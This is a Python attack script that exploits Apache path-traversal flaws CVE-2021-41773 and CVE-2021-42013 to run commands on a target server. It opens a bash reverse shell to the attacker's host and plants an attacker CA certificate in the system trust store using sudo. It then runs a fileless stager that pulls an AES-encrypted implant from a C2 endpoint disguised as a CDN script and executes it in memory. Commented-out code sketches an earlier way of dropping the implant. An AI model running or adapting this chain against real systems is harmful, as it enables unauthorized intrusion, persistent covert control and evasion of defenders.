"""Initial exploit to drop implant"""

import shlex
import socket
import ssl
import time
import requests

exploit_filename = "implant.py"


def main():
    host_ip = "" or input("enter your attacker/host/local ip:")
    target_ip = "" or input("enter target ip:")
    target = target_ip + ":" + "8080"
    cve_choice = 0

    CVE_2021_41773 = "/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash"
    CVE_2021_42013 = "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash"

    url = "http://" + target + (CVE_2021_41773, CVE_2021_42013)[cve_choice % 2]

    # Once we connect using the CVE, we can run any command.

    # implant_contents = ""
    # with open(exploit_filename, "r", encoding="utf-8") as f:
    #     implant_contents = f.read()

    ca_contents = ""
    with open("cert/ca.crt", "r", encoding="utf-8") as f:
        ca_contents = f.read()

    # set up encrypted reverse shell listener so we don't send the entire exploit through unencrypted http
    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    context.load_cert_chain(certfile="cert/cert.pem", keyfile="cert/key.pem")

    bindsocket = socket.socket()
    bindsocket.bind((host_ip, 4444))
    bindsocket.listen(5)
    newsocket, addr = bindsocket.accept()
    conn = context.wrap_socket(newsocket, server_side=True)

    # send reverse shell
    command = f"/bin/bash -i >& /dev/tcp/{host_ip}/4444 0>&1;"
    req = requests.Request("POST", url=url, data=command)

    # install attacker CA cert
    for cmd in [
        f"echo {shlex.quote(ca_contents)} | sudo tee /usr/local/share/ca-certificates/ca.crt",
        "cat /usr/local/share/ca-certificates/ca.crt | sudo tee -a /etc/ssl/certs/ca-certificates.crt",
        "sudo update-ca-certificates",
    ]:
        conn.send(cmd.encode() + b"\n")
        print(conn.recv(4096).decode())

    # run fileless python stager to install and run implant in-memory
    c2_port = 8443
    c2_stager_endpoint = "/cdn/bootstrap.js"
    key = b"Kg.\xe1\xfb\x8e\xf6\x81\xa2\xf0g\xd6\xfd\x00\x047\xd0m\xe3\xe7E@\x00\xb4=\xc7\xb4\xc4-\x87\x0c\x17"
    cmd = "".join(
        [
            r"python3 -c 'import requests,os,subprocess,sys;",
            r"from Crypto.Cipher import AES;",
            # download encrypted payload from c2
            f'r=requests.post("https://{host_ip}:{c2_port}{c2_stager_endpoint}");',
            r"c=r.content;",
            # decrypt payload
            f"k={key};",
            r"d=AES.new(k,AES.MODE_GCM,nonce=c[:12]).decrypt_and_verify(c[12:-16],c[-16:]);",
            # create in-memory file descriptor to store payload
            r'fd=os.memfd_create("x",0);',
            r"os.write(fd,d);",
            r"os.lseek(fd, 0, os.SEEK_SET);",
            # run payload as new background process and exit
            r"subprocess.Popen(['nohup','/proc/self/fd/'+str(fd)],stdin=subprocess.DEVNULL,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL,start_new_session=True);",
            r"sys.exit(0);'",
        ]
    )
    conn.send(cmd.encode() + b"\n")
    print(conn.recv(4096).decode())

    # Run touch command to create a file with the implant contents
    # command = f"echo {shlex.quote(implant_contents)} > /tmp/{exploit_filename}"

    # prepared = req.prepare()
    # prepared.url = url

    # print(f"Sending command to {url} to write implant to /tmp/{exploit_filename}")

    # response = requests.Session().send(prepared, verify=False)
    # if response.status_code == 200:
    #     print(f"Exploit successful! Implant written to /tmp/{exploit_filename}")
    # else:
    #     print(f"Exploit failed with status code: {response.status_code}")
    #     print(f"Response: {response.text}")

    # Wait 3
    # time.sleep(3)

    # Attempt to get the target to install pycryptodome via pip

    # command = "pip install pycryptodome"
    # req = requests.Request('POST', url=url, data=command)
    # prepared = req.prepare()
    # prepared.url = url
    # response = requests.Session().send(prepared, verify=False)
    # if response.status_code == 200:
    #     print("Pycryptodome installation command sent successfully.")
    # else:
    #     print(f"Failed to send installation command with status code: {response.status_code}")
    #     print(f"Response: {response.text}")

    # # Wait 3 seconds
    # time.sleep(3)

    # Attempt to get the target to run the implant

    # command = f"python3 /tmp/{exploit_filename}"
    # req = requests.Request("POST", url=url, data=command)
    # prepared = req.prepare()
    # prepared.url = url
    # response = requests.Session().send(prepared, verify=False)
    # print(response.status_code, response.text)


if __name__ == "__main__":
    main()
